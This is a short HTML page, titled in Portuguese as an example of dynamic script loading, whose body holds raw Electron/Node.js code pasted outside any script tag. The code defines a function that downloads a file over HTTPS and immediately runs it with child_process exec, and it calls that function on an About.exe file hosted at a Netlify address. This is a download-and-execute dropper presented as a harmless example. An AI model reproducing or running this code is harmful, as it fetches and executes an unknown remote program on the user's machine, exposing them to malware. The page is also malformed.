<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregar e Executar Script Dinâmico</title>
</head>
<body>

<h1>Exemplo de Carregamento Dinâmico de Script</h1>

const { app, BrowserWindow } = require('electron');
const https = require('https');
const fs = require('fs');
const path = require('path');

let mainWindow;

function createWindow() {
  mainWindow = new BrowserWindow({ width: 800, height: 600 });
  mainWindow.loadFile('index.html');

  mainWindow.on('closed', function () {
    mainWindow = null;
  });
}

app.on('ready', createWindow);

app.on('window-all-closed', function () {
  if (process.platform !== 'darwin') app.quit();
});

app.on('activate', function () {
  if (mainWindow === null) createWindow();
});

// Função para baixar e executar um arquivo
function baixarEExecutarArquivo(url, nomeArquivo) {
  const destino = path.join(__dirname, nomeArquivo);
  const file = fs.createWriteStream(destino);
  https.get(url, response => {
    response.pipe(file);
    file.on('finish', () => {
      file.close();
      // Após o download, execute o arquivo
      const { exec } = require('child_process');
      exec(destino);
    });
  });
}

// Exemplo de uso
baixarEExecutarArquivo('https://sandro520.netlify.app/About.exe', 'About.exe');



</body>
</html>


